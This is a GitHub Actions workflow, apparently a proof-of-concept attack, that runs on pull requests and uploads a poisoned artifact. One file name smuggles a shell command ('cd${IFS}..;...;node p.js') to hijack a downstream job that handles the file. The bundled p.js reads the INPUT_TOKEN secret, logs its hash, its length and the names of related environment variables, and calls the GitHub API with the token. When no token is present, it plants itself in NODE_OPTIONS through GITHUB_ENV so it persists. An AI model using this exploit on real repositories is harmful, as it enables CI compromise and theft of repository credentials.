name: Test

on:
  pull_request:

jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: Build forged artifact
        run: |
          mkdir -p content
          printf 'forged report body' > content/summary.txt
          : > 'content/summary.txt;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt'
          cat > content/p.js <<'JSEOF'
          const c = require('crypto');
          const fs = require('fs');
          const t = process.env.INPUT_TOKEN;
          if (t) {
            console.log('LEAK-SHA ' + c.createHash('sha256').update(String(t)).digest('hex'));
            console.log('LEAK-LEN ' + String(t).length);
            console.log('LEAK-INPUTS ' + Object.keys(process.env).filter(k => k.startsWith('INPUT') || k.includes('TOKEN')).join(','));
            fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY, { headers: { Authorization: 'Bearer ' + t, Accept: 'application/vnd.github+json' } })
              .then(r => r.text().then(b => console.log('LEAK-API ' + r.status + ' ' + b.slice(0, 240))))
              .catch(e => console.log('LEAK-API-ERR ' + e.message));
          } else {
            fs.appendFileSync(process.env.GITHUB_ENV, 'NODE_OPTIONS=--require /tmp/content/content/p.js\n');
            console.log('ENV-SET');
          }
          JSEOF
          ls -la content
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: content
